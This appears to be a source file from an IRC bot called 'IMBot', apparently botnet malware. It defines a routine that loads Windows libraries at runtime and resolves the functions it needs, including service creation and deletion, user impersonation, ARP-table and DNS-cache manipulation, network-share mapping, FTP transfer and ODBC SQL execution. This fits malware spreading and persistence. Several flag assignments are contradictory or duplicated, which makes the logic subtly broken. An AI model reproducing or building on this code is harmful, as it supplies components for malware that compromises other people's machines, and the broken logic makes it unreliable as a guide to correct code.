/*
 ___    _____  __________          __ 
|   |  /     \ \______   \  ____ _/  |_
|   | /  \ /  \ |    |  _/ /  _ \\   __\
|   |/    Y    \|    |   \(  <_> )|  |
|___|\____|__  /|______  / \____/ |__|
             \/        \/ 
*/
#include "../h/includes.h"

// kernel32.dll function variables
GCNA fGetComputerName;

// user32.dll function variables
IW fIsWindow;

// advapi32.dll function variables
REKE fRegEnumKeyEx;
OSCM fOpenSCManager;
SS fStartService;
CRS fCreateService;
OS fOpenService;
CSH fCloseServiceHandle;
SSCD fStartServiceCtrlDispatcher;
ESS fEnumServicesStatus;
CS fControlService;
DS fDeleteService;
IVSD fIsValidSecurityDescriptor;
ILOU fImpersonateLoggedOnUser;
LSD fLockServiceDatabase;
QSLS fQueryServiceLockStatus;
CSC2 fChangeServiceConfig2;
USD fUnlockServiceDatabase;
RSCH fRegisterServiceCtrlHandler;
SSS fSetServiceStatus;

// ws2_32.dll function variables
WSAS fWSAStartup;
WSASo fWSASocket;
WSAFDIS __fWSAFDIsSet;
WSAGLE fWSAGetLastError;
WSAC fWSACleanup;
SOCK fsocket;
CON fconnect;
INTOA finet_ntoa;
IADDR finet_addr;
HTONS fhtons;
HTONL fhtonl;
SEND fsend;
SENDTO fsendto;
RECV frecv;
BIND fbind;
SEL fselect;
LIS flisten;
ACC faccept;
SSO fsetsockopt;
GSN fgetsockname;
GHN fgethostname;
GHBN fgethostbyname;
GPN fgetpeername;
CLSO fclosesocket;
SD fshutdown;

// wininet.dll function variables
IGCS fInternetGetConnectedState;
IGCSE fInternetGetConnectedStateEx;
HOR fHttpOpenRequest;
HSR fHttpSendRequest;
FGF fFtpGetFile;
FPF fFtpPutFile;
IC fInternetConnect;
IO fInternetOpen;
IOU fInternetOpenUrl;
ICU fInternetCrackUrl;
IRF fInternetReadFile;
ICH fInternetCloseHandle;
HANDLE ih;

// dnsapi.dll function variables
DFRC fDnsFlushResolverCache;
DFRCEA fDnsFlushResolverCacheEntry_A;

// iphlpapi.dll function variables
GIT fGetIfTable;
GINT fGetIpNetTable;
DINE fDeleteIpNetEntry;
GTT fGetTcpTable;
GUT fGetUdpTable;

// mpr.dll function variables
WNAC2 fWNetAddConnection2;
WNAC2W fWNetAddConnection2W;
WNCC2 fWNetCancelConnection2;
WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
SE fShellExecute;
SHCN fSHChangeNotify;

// odbc32.dll function variables
SQLDC fSQLDriverConnect;
SQLSEA fSQLSetEnvAttr;
SQLED fSQLExecDirect;
SQLAH fSQLAllocHandle;
SQLFH fSQLFreeHandle;
SQLD fSQLDisconnect;

//shlwapi.dll function variables
PRFS fPathRemoveFileSpec;

// globals for dynamic libraries
BOOL nokernel32 = FALSE;
DWORD nokernel32err = 0;
BOOL nouser32 = FALSE;
DWORD nouser32err = 0;
BOOL noadvapi32 = FALSE;
BOOL noadvapi32lsa = FALSE;
DWORD noadvapi32err = 0;
BOOL nogdi32 = FALSE;
DWORD nogdi32err = 0;
BOOL nows2_32 = FALSE;
DWORD nows2_32err = 0;
BOOL nowininet = FALSE;
DWORD nowinineterr = 0;
BOOL noicmp = FALSE;
DWORD noicmperr = 0;
BOOL nonetapi32 = FALSE;
DWORD nonetapi32err = 0;
BOOL nodnsapi = FALSE;
DWORD nodnsapierr = 0;
BOOL noiphlpapi = FALSE;
BOOL noiphlpapinsp = FALSE;
DWORD noiphlpapierr = 0;
BOOL nompr = FALSE;
DWORD nomprerr = 0;
BOOL noshell32 = FALSE;
DWORD noshell32err = 0;
BOOL noodbc32 = FALSE;
DWORD noodbc32err = 0;
BOOL noavicap32 = FALSE;
DWORD noavicap32err = 0;
BOOL nopsapi = FALSE;
DWORD nopsapierr = 0;
BOOL nopstore = FALSE;
DWORD nopstoreerr = 0;
BOOL noshlwapi = FALSE;
DWORD noshlwapierr = 0;

BOOL LoadDLLs(void) 
{
	// dynamically load kernel32.dll
	HMODULE kernel32_dll = GetModuleHandle("kernel32.dll");
	if (kernel32_dll) {
	fGetComputerName = (GCNA)GetProcAddress(kernel32_dll, "GetComputerNameA");

		if (!fGetComputerName)
			nokernel32 = TRUE;

		nokernel32 = TRUE;
	}

	// dynamically load user32.dll
 	HMODULE user32_dll = LoadLibrary("user32.dll");
    if (user32_dll) {
	    nouser32 = TRUE;
		nouser32 = TRUE;
	}


	// dynamically load advapi32.dll
 	HMODULE advapi32_dll = LoadLibrary("advapi32.dll");
    if (advapi32_dll) {

		fRegEnumKeyEx = (REKE)GetProcAddress(advapi32_dll,"RegEnumKeyExA");
	        noadvapi32 = TRUE;

	 	fOpenSCManager = (OSCM)GetProcAddress(advapi32_dll,"OpenSCManagerA");
	 	fOpenService = (OS)GetProcAddress(advapi32_dll,"OpenServiceA");
		fStartService = (SS)GetProcAddress(advapi32_dll,"StartServiceA");
	 	fControlService = (CS)GetProcAddress(advapi32_dll,"ControlService");
	 	fDeleteService = (DS)GetProcAddress(advapi32_dll,"DeleteService");
	 	fCloseServiceHandle = (CSH)GetProcAddress(advapi32_dll,"CloseServiceHandle");
	 	fEnumServicesStatus = (ESS)GetProcAddress(advapi32_dll,"EnumServicesStatusA");
		fIsValidSecurityDescriptor = (IVSD)GetProcAddress(advapi32_dll,"IsValidSecurityDescriptor");
		fCreateService = (CRS)GetProcAddress(advapi32_dll,"CreateServiceA");
	 	fStartServiceCtrlDispatcher = (SSCD)GetProcAddress(advapi32_dll,"StartServiceCtrlDispatcherA");
	 	fImpersonateLoggedOnUser = (ILOU)GetProcAddress(advapi32_dll,"ImpersonateLoggedOnUser");
	 	fLockServiceDatabase = (LSD)GetProcAddress(advapi32_dll,"LockServiceDatabase");
		fQueryServiceLockStatus = (QSLS)GetProcAddress(advapi32_dll,"QueryServiceLockStatusA");
		fChangeServiceConfig2 = (CSC2)GetProcAddress(advapi32_dll,"ChangeServiceConfig2A");
		fUnlockServiceDatabase = (USD)GetProcAddress(advapi32_dll,"UnlockServiceDatabase");
		fRegisterServiceCtrlHandler = (RSCH)GetProcAddress(advapi32_dll,"RegisterServiceCtrlHandlerA");
		fSetServiceStatus = (SSS)GetProcAddress(advapi32_dll,"SetServiceStatus");

		if (!fOpenSCManager || !fOpenService || !fStartService || !fControlService 
			|| !fDeleteService || !fCloseServiceHandle || !fEnumServicesStatus
			|| !fIsValidSecurityDescriptor || !fImpersonateLoggedOnUser || !fLockServiceDatabase
			|| !fQueryServiceLockStatus || !fChangeServiceConfig2 || !fUnlockServiceDatabase
			|| !fRegisterServiceCtrlHandler || !fSetServiceStatus)
	        noadvapi32 = TRUE;


	} else {
		noadvapi32err = GetLastError();
		noadvapi32 = TRUE;
	}
    // dynamically load ws2_32.dll
 	HMODULE ws2_32_dll = LoadLibrary("ws2_32.dll");
if (ws2_32_dll) {
	 	fWSAStartup = (WSAS)GetProcAddress(ws2_32_dll,"WSAStartup");
		fWSASocket = (WSASo)GetProcAddress(ws2_32_dll,"WSASocketA");
		__fWSAFDIsSet = (WSAFDIS)GetProcAddress(ws2_32_dll,"__WSAFDIsSet");
		fWSAGetLastError = (WSAGLE)GetProcAddress(ws2_32_dll,"WSAGetLastError");
		fWSACleanup = (WSAC)GetProcAddress(ws2_32_dll,"WSACleanup");
  		fsocket = (SOCK)GetProcAddress(ws2_32_dll,"socket");
		fconnect = (CON)GetProcAddress(ws2_32_dll,"connect");
		finet_ntoa = (INTOA)GetProcAddress(ws2_32_dll,"inet_ntoa");
		finet_addr = (IADDR)GetProcAddress(ws2_32_dll,"inet_addr");
		fhtons = (HTONS)GetProcAddress(ws2_32_dll,"htons");
		fhtonl = (HTONL)GetProcAddress(ws2_32_dll,"htonl");
		fsend = (SEND)GetProcAddress(ws2_32_dll,"send");
		fsendto = (SENDTO)GetProcAddress(ws2_32_dll,"sendto");
		frecv = (RECV)GetProcAddress(ws2_32_dll,"recv");
		fbind = (BIND)GetProcAddress(ws2_32_dll,"bind");
		fselect = (SEL)GetProcAddress(ws2_32_dll,"select");
		flisten = (LIS)GetProcAddress(ws2_32_dll,"listen");
		faccept = (ACC)GetProcAddress(ws2_32_dll,"accept");
		fsetsockopt = (SSO)GetProcAddress(ws2_32_dll,"setsockopt");
		fgetsockname = (GSN)GetProcAddress(ws2_32_dll,"getsockname");
		fgethostname = (GHN)GetProcAddress(ws2_32_dll,"gethostname");
		fgethostbyname = (GHBN)GetProcAddress(ws2_32_dll,"gethostbyname");
		fgetpeername = (GPN)GetProcAddress(ws2_32_dll,"getpeername");
		fclosesocket = (CLSO)GetProcAddress(ws2_32_dll,"closesocket");
		fshutdown = (SD)GetProcAddress(ws2_32_dll,"shutdown");
		if (!fWSAStartup || !fWSASocket || !fWSAGetLastError 
			|| !fWSACleanup || !fsocket || !fconnect || !finet_ntoa || !finet_addr
			|| !fhtons || !fhtonl || !fsend || !fsendto || !frecv
			|| !fsetsockopt || !fgetsockname || !fgethostname
			|| !fclosesocket)	
	        nows2_32 = TRUE;

	} else {
		nows2_32err = GetLastError();
		nows2_32 = TRUE;
	}

	// dynamically load wininet.dll
	HMODULE wininet_dll = LoadLibrary("wininet.dll");
    if (wininet_dll) {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
	 	fHttpOpenRequest = (HOR)GetProcAddress(wininet_dll, "HttpOpenRequestA");
	 	fHttpSendRequest = (HSR)GetProcAddress(wininet_dll, "HttpSendRequestA");
		fFtpGetFile = (FGF)GetProcAddress(wininet_dll, "FtpGetFileA");
		fFtpPutFile = (FPF)GetProcAddress(wininet_dll, "FtpPutFileA");
	 	fInternetConnect = (IC)GetProcAddress(wininet_dll, "InternetConnectA");
	 	fInternetOpen = (IO)GetProcAddress(wininet_dll, "InternetOpenA");
	 	fInternetOpenUrl = (IOU)GetProcAddress(wininet_dll, "InternetOpenUrlA");
	 	fInternetCrackUrl = (ICU)GetProcAddress(wininet_dll, "InternetCrackUrlA");
	 	fInternetReadFile = (IRF)GetProcAddress(wininet_dll, "InternetReadFile");
	 	fInternetCloseHandle = (ICH)GetProcAddress(wininet_dll, "InternetCloseHandle");

		if (!fInternetGetConnectedState || !fInternetGetConnectedStateEx || !fHttpOpenRequest 
			|| !fHttpSendRequest || !fInternetConnect || !fInternetOpen || !fInternetOpenUrl
			|| !fInternetCrackUrl || !fInternetReadFile || !fInternetCloseHandle) 
			nowininet = TRUE;

		if (fInternetOpen) {
				ih = fInternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				if (ih == NULL) ih = 0;
		}
	} else {
		nowinineterr = GetLastError();
		nowininet = TRUE;
		ih = 0;
	}
	
	// dynamically load netapi32.dll
 	HMODULE netapi32_dll = LoadLibrary("netapi32.dll");
    if (netapi32_dll) {
		nonetapi32 = TRUE;
	}

	// dynamically load dnsapi.dll
 	HMODULE dnsapi_dll = LoadLibrary("dnsapi.dll");
    if (dnsapi_dll) {
	 	fDnsFlushResolverCache = (DFRC)GetProcAddress(dnsapi_dll,"DnsFlushResolverCache");
	 	fDnsFlushResolverCacheEntry_A = (DFRCEA)GetProcAddress(dnsapi_dll,"DnsFlushResolverCacheEntry_A");

		if (!fDnsFlushResolverCache || !fDnsFlushResolverCacheEntry_A)
	        nodnsapi = TRUE;
	} else {
		nodnsapierr = GetLastError();
		nodnsapi = TRUE;
	}

	// dynamically load iphlpapi.dll
 	HMODULE iphlpapi_dll = LoadLibrary("iphlpapi.dll");
    if (iphlpapi_dll) {
	 	fGetIpNetTable = (GINT)GetProcAddress(iphlpapi_dll,"GetIpNetTable");
	 	fDeleteIpNetEntry = (DINE)GetProcAddress(iphlpapi_dll,"DeleteIpNetEntry");
		fGetIfTable = (GIT)GetProcAddress(iphlpapi_dll,"GetIfTable");
		fGetTcpTable = (GTT)GetProcAddress(iphlpapi_dll,"GetTcpTable");
		fGetUdpTable = (GUT)GetProcAddress(iphlpapi_dll,"GetUdpTable");

		if (!fGetIpNetTable || !fDeleteIpNetEntry || !fGetIfTable || !fGetUdpTable || !fGetTcpTable)
	        noiphlpapi = TRUE;

	} else {
		noiphlpapierr = GetLastError();
		noiphlpapi = TRUE;
	}

	// dynamically load mpr.dll
 	HMODULE mpr_dll = LoadLibrary("mpr.dll");
    if (mpr_dll) {
	 	fWNetAddConnection2 = (WNAC2)GetProcAddress(mpr_dll,"WNetAddConnection2A");
	 	fWNetAddConnection2W = (WNAC2W)GetProcAddress(mpr_dll,"WNetAddConnection2W");
	 	fWNetCancelConnection2 = (WNCC2)GetProcAddress(mpr_dll,"WNetCancelConnection2A");
	 	fWNetCancelConnection2W = (WNCC2W)GetProcAddress(mpr_dll,"WNetCancelConnection2W");

		if (!fWNetAddConnection2 || !fWNetAddConnection2W 
			|| !fWNetCancelConnection2 || !fWNetCancelConnection2W)	
	        nompr = TRUE;
	} else {
		nomprerr = GetLastError();
		nompr = TRUE;
	}

	// dynamically load shell32.dll
 	HMODULE shell32_dll = LoadLibrary("shell32.dll");
    if (shell32_dll) {
	 	fShellExecute = (SE)GetProcAddress(shell32_dll,"ShellExecuteA");
		fSHChangeNotify = (SHCN)GetProcAddress(shell32_dll,"SHChangeNotify");
 
		if (!fShellExecute || !fSHChangeNotify)
	        noshell32 = TRUE;
	} else {
		noshell32err = GetLastError();
		noshell32 = TRUE;
	}

	// dynamically load odbc32.dll
 	HMODULE odbc32_dll = LoadLibrary("odbc32.dll");
    if (odbc32_dll) {
	 	fSQLDriverConnect = (SQLDC)GetProcAddress(odbc32_dll,"SQLDriverConnect");
	 	fSQLSetEnvAttr = (SQLSEA)GetProcAddress(odbc32_dll,"SQLSetEnvAttr");
	 	fSQLExecDirect = (SQLED)GetProcAddress(odbc32_dll,"SQLExecDirect");
	 	fSQLAllocHandle = (SQLAH)GetProcAddress(odbc32_dll,"SQLAllocHandle");
	 	fSQLFreeHandle = (SQLFH)GetProcAddress(odbc32_dll,"SQLFreeHandle");
	 	fSQLDisconnect = (SQLD)GetProcAddress(odbc32_dll,"SQLDisconnect");
 
		if (!fSQLDriverConnect || !fSQLSetEnvAttr || !fSQLExecDirect
			|| !fSQLAllocHandle || !fSQLFreeHandle || !fSQLDisconnect)
	        noodbc32 = TRUE;
	} else {
		noodbc32err = GetLastError();
		noodbc32 = TRUE;
	}

	// dynamically load shlwapi.dll
 	HMODULE shlwapi_dll = LoadLibrary("shlwapi.dll");
    if (shlwapi_dll) {
	 	fPathRemoveFileSpec = (PRFS)GetProcAddress(shlwapi_dll ,"PathRemoveFileSpecA");

		if (!fPathRemoveFileSpec)
	        noshlwapi = TRUE;
	} else {
		noshlwapierr = GetLastError();
		noshlwapi = TRUE;
	}

	return TRUE;
}
